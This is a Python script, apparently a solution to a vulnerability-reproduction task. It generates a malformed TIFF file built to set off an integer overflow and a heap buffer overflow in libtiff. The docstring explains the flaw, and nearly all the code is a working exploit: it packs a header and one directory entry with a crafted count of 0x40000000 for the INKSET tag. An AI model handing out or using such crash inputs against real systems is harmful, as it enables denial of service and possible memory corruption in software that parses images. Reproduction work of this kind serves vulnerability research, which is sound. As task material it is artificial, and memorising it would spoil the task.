import struct

class Solution:
    def solve(self, src_path: str) -> bytes:
        """
        Generates a Proof-of-Concept (PoC) for a heap buffer overflow in libtiff.

        The vulnerability stems from an integer overflow when calculating the size
        of data for a TIFF tag. By providing a large 'count' value in a directory
        entry, the calculation `count * sizeof(type)` can overflow a 32-bit signed
        integer (`tsize_t` on 32-bit platforms). This results in a negative size,
        which bypasses bounds checks. Subsequently, a `memcpy` operation is
        performed with a huge size argument (due to the negative value being cast
        to an unsigned `size_t`), leading to a massive read beyond the buffer's
        bounds.

        This PoC constructs a minimal TIFF file with a single directory entry
        crafted to trigger this specific integer overflow.
        """

        # TIFF Header (8 bytes):
        # - 'II' for little-endian byte order.
        # - Version 42 (0x2a).
        # - Offset to the first Image File Directory (IFD) is 8.
        header = b'II\x2a\x00\x08\x00\x00\x00'

        # IFD (Image File Directory):
        # It starts with a 2-byte count of directory entries.
        num_entries = 1
        ifd_header = struct.pack('<H', num_entries)

        # Malicious Directory Entry (12 bytes):
        # - Tag ID: 332 (TIFFTAG_INKSET), a standard tag.
        # - Type: 3 (SHORT), which has a size of 2 bytes per value.
        # - Count: 0x40000000. When multiplied by the type size (2), the result
        #   is 0x80000000, which overflows a 32-bit signed integer.
        # - Value/Offset: 0, as per the vulnerability description.
        tag_id = 332
        tag_type = 3
        tag_count = 0x40000000
        tag_value_or_offset = 0
        directory_entry = struct.pack('<HHII', tag_id, tag_type, tag_count, tag_value_or_offset)

        # End of IFD chain:
        # A 4-byte offset to the next IFD. 0 indicates no more IFDs.
        next_ifd_offset = struct.pack('<I', 0)

        # Assemble the PoC:
        poc_bytes = header + ifd_header + directory_entry + next_ifd_offset
        
        return poc_bytes